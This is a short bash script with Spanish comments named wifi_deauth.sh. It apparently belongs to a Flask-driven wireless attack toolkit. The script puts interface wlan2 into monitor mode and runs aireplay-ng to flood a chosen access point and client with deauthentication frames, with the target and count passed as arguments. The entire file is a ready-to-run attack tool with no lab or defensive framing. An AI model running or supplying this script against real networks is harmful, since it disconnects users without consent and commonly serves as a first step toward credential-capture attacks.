#!/bin/bash
# ==============================================================================
# wifi_deauth.sh - Ataque de desautenticación inalámbrica directo.
# ==============================================================================
GREEN='\033[0;32m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'

IFACE="wlan2"
TARGET_BSSID="$1"
TARGET_CLIENT="$2"
DEAUTH_COUNT="$3"

echo -e "${CYAN}[*] Iniciando inyección de paquetes deauth en $IFACE...${NC}"

# Validar permisos y dependencias
if [ -z "$TARGET_BSSID" ]; then
    echo -e "${RED}[X] Error: BSSID faltante.${NC}"; exit 1
fi

# Poner interfaz en modo monitor si no lo está (Lógica limpia de monitor.sh)
ip link set "$IFACE" down 2>/dev/null
iw dev "$IFACE" set type monitor 2>/dev/null
ip link set "$IFACE" up 2>/dev/null

echo -e "${GREEN}[OK] Inyectando $DEAUTH_COUNT tramas de desautenticación...${NC}"
echo -e "${CYAN}    Objetivo AP: $TARGET_BSSID | Cliente: $TARGET_CLIENT${NC}"
echo ""

# Ejecución nativa enviando la salida directamente al buffer de Flask
aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$IFACE"

echo ""
echo -e "${GREEN}[OK] Ataque de desautenticación finalizado.${NC}"
